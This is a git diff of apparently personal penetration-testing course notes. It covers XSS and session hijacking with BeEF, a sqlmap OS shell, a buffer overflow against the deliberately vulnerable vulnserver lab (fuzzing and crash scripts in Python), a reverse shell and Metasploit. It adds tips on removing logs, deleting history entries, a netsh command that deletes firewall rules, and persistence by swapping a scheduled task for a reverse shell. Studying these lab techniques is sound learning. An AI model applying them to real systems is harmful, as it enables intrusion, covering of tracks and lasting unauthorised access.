@@ -1112,19 +1112,13 @@ Check the security.txt if there's information about the bug bounty (same as robo
 
 ![](assets/2022-08-31-19-23-55-image.png)
 
-
-
 Steps:
 
 1. Crosssite Scripting
 
 2. Session Hijacking
 
-
-
 ![](assets/2022-08-31-19-26-01-image.png)
-
-
 
 > **What is BeEF?**
 > 
@@ -1132,8 +1126,6 @@ Steps:
 >  penetration testing tool that focuses on the web browser.
 
 https://beefproject.com/
-
-
 
 ![](assets/2022-08-31-19-32-05-image.png)
 
@@ -1171,8 +1163,6 @@ https://beefproject.com/
 
 ![](assets/2022-08-31-19-53-43-image.png)
 
-
-
 **sqlmap OS shell upload**
 
 ![](assets/2022-08-31-19-55-27-image.png)
@@ -1186,8 +1176,6 @@ https://beefproject.com/
 ```
 https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/
 ```
-
-
 
 **Buffer Overflow**
 
@@ -1211,24 +1199,37 @@ https://immunityinc.com/products/debugger/
 
 ![](assets/2022-08-31-20-18-44-image.png)
 
-
-
 Code:
 
-
-
 ```
-#!/usr/bin/pythonimport socketimport osimport sysimport timehost="10.211.55.7"port=4444buffer=["A"]counter=100while len(buffer) <= 30:                buffer.append("A"*counter)                counter=counter+200for string in buffer:        print "fuzzing TRUN with %s bytes" % len(string)        expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        expl.connect((host, port))        expl.send("TRUN /.:/" + string)        expl.close()	time.sleep(1)
+#!/usr/bin/python
 
+import socket
+import os
+import sys
+import time
+
+host="10.211.55.7"
+port=4444
+
+buffer=["A"]
+counter=100
+while len(buffer) <= 30:
+                buffer.append("A"*counter)
+                counter=counter+200
+
+for string in buffer:
+        print "fuzzing TRUN with %s bytes" % len(string)
+        expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        expl.connect((host, port))
+        expl.send("TRUN /.:/" + string)
+        expl.close()
+    time.sleep(1)
 ```
-
-
 
 ![](assets/2022-08-31-20-20-12-image.png)
 
 ![](assets/2022-08-31-20-20-38-image.png)
-
-
 
 **Menu -> File -> Attach**
 
@@ -1246,25 +1247,30 @@ Code:
 
 ![](assets/2022-08-31-20-27-36-image.png)
 
-
-
 **Lead to DDoS**
 
 ![](assets/2022-08-31-20-29-25-image.png)
 
-
-
 [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
-
-
-
-
 
 ![](assets/2022-08-31-20-32-30-image.png)
 
 ```
-#!/usr/bin/pythonimport socketimport osimport syshost="10.211.55.7"port=4444buffer = "TRUN /.:/" + "A" * 5900expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)expl.connect((host, port))expl.send(buffer)expl.close()
+#!/usr/bin/python
 
+import socket
+import os
+import sys
+
+host="10.211.55.7"
+port=4444
+
+buffer = "TRUN /.:/" + "A" * 5900
+
+expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+expl.connect((host, port))
+expl.send(buffer)
+expl.close()
 ```
 
 ![](assets/2022-08-31-20-34-39-image.png)
@@ -1316,10 +1322,235 @@ https://shell-storm.org/shellcode/
 > from quick search in Google: What is ASLR in operating system?
 > ASLR MEANING Address Space Layout Randomization (ASLR) is a computer security technique which involves randomly positioning the base address of an executable and the position of libraries, heap, and stack, in a process's address space.
 
-
-
 - LiveOverflow on youtube
 
 - Plus the Tryhackme Buffer Overflow Prep room
 
 - Also consider learning pwntools
+
+---
+
+## Day 10 – Privilege Escalation
+
+![](assets/2022-09-01-19-17-07-image.png)
+
+![](assets/2022-09-01-19-13-23-image.png)
+
+![](assets/2022-09-01-19-13-34-image.png)
+
+![](assets/2022-09-01-19-13-54-image.png)
+
+![](assets/2022-09-01-19-14-28-image.png)
+
+![](assets/2022-09-01-19-15-15-image.png)
+
+search for `jump esp`
+
+![](assets/2022-09-01-19-20-22-image.png)
+
+![](assets/2022-09-01-19-22-56-image.png)
+
+![](assets/2022-09-01-19-26-12-image.png)
+
+![](assets/2022-09-01-19-26-37-image.png)
+
+
+
+> From Chat
+> 
+> If you're Looking for strings in a program, you could also use something like Ghidra or IDA
+
+
+
+![](assets/2022-09-01-19-27-51-image.png)
+
+![](assets/2022-09-01-19-29-14-image.png)
+
+> From Chat:
+> Also one on the history of Ghidra (used to be a tool developped by IntelligenceAgencies and then became open source:
+> 
+> https://www.youtube.com/watch?v=kx2xp7IQNSc
+
+
+
+![](assets/2022-09-01-19-33-34-image.png)
+
+![](assets/2022-09-01-19-36-45-image.png)
+
+![](assets/2022-09-01-19-37-10-image.png)
+
+
+
+![](assets/2022-09-01-19-39-18-image.png)
+
+`351` is payload size
+
+
+
+![](assets/2022-09-01-19-40-11-image.png)
+
+\x90 (is a space) multiply by 16
+
+![](assets/2022-09-01-19-42-00-image.png)
+
+![](assets/2022-09-01-19-42-13-image.png)
+
+**Programm not anymore crasht**
+
+![](assets/2022-09-01-19-43-11-image.png)
+
+**Reverse shell worked**
+
+![](assets/2022-09-01-19-43-25-image.png)
+
+**Remote Desktop**
+
+![](assets/2022-09-01-19-52-13-image.png)
+
+![](assets/2022-09-01-19-55-35-image.png)
+
+![](assets/2022-09-01-19-55-42-image.png)
+
+```
+https://github.com/stephenbradshaw/vulnserver
+```
+
+> From Chat
+> 
+> Here's an example from a CSS course Assignment, where I did some powershel deobfuscation from a payload extracted from a memory dump:
+> 
+> https://import.cdn.thinkific.com/380432/nmxRVUvRmW4ICetXD2ww_Assignment-20--20Volatility-2001-20--20Robert-20Seyer.pdf
+
+
+
+![](assets/2022-09-01-20-14-58-image.png)
+
+
+
+```
+show payloads
+```
+
+
+
+![](assets/2022-09-01-20-15-19-image.png)
+
+```
+show info
+```
+
+```
+show options
+```
+
+![](assets/2022-09-01-20-16-44-image.png)
+
+![](assets/2022-09-01-20-17-17-image.png)
+
+![](assets/2022-09-01-20-18-25-image.png)
+
+![](assets/2022-09-01-20-18-56-image.png)
+
+![](assets/2022-09-01-20-19-21-image.png)
+
+![](assets/2022-09-01-20-19-47-image.png)
+
+![](assets/2022-09-01-20-20-15-image.png)
+
+![](assets/2022-09-01-20-20-51-image.png)
+
+![](assets/2022-09-01-20-21-25-image.png)
+
+![](assets/2022-09-01-20-22-05-image.png)
+
+![](assets/2022-09-01-20-23-00-image.png)
+
+![](assets/2022-09-01-20-23-27-image.png)
+
+![](assets/2022-09-01-20-23-45-image.png)
+
+![](assets/2022-09-01-20-23-52-image.png)
+
+![](assets/2022-09-01-20-24-03-image.png)
+
+![](assets/2022-09-01-20-24-56-image.png)
+
+![](assets/2022-09-01-20-28-06-image.png)
+
+![](assets/2022-09-01-20-30-14-image.png)
+
+**Remove Logs**
+
+![](assets/2022-09-01-20-49-13-image.png)
+
+![](assets/2022-09-01-20-49-39-image.png)
+
+![](assets/2022-09-01-20-32-32-image.png)
+
+![](assets/2022-09-01-20-35-40-image.png)
+
+![](assets/2022-09-01-20-35-08-image.png)
+
+![](assets/2022-09-01-20-36-14-image.png)
+
+![](assets/2022-09-01-20-36-28-image.png)
+
+![](assets/2022-09-01-20-36-53-image.png)
+
+![](assets/2022-09-01-20-37-06-image.png)
+
+**Delete SingelCommand in History**
+
+![](assets/2022-09-01-20-38-29-image.png)
+
+![](assets/2022-09-01-20-39-39-image.png)
+
+![](assets/2022-09-01-20-41-59-image.png)
+
+![](assets/2022-09-01-20-42-13-image.png)
+
+![](assets/2022-09-01-20-43-52-image.png)
+
+![](assets/2022-09-01-20-45-18-image.png)
+
+![](assets/2022-09-01-20-45-38-image.png)
+
+![](assets/2022-09-01-20-46-37-image.png)
+
+![](assets/2022-09-01-20-47-21-image.png)
+
+
+
+![](assets/2022-09-01-20-49-23-image.png)
+
+![](assets/2022-09-01-20-50-00-image.png)
+
+![](assets/2022-09-01-20-50-19-image.png)
+
+![](assets/2022-09-01-20-50-39-image.png)
+
+![](assets/2022-09-01-20-50-46-image.png)
+
+![](assets/2022-09-01-20-51-58-image.png)
+
+![](assets/2022-09-01-20-59-53-image.png)
+
+![](assets/2022-09-01-21-00-20-image.png)
+
+![](assets/2022-09-01-21-00-30-image.png)
+
+```
+netsh advfirewall firewall delete rule name=all protocol=tcp localport=80
+```
+
+![](assets/2022-09-01-21-00-44-image.png)
+
+> Scheduled Tasks are a popular way to get persistence on a machine.
+
+![](assets/2022-09-01-21-01-05-image.png)
+
+Replace Task with your own Reverse Shell .exe
+
+![](assets/2022-09-01-21-02-28-image.png)
+
+![](assets/2022-09-01-21-02-43-image.png)
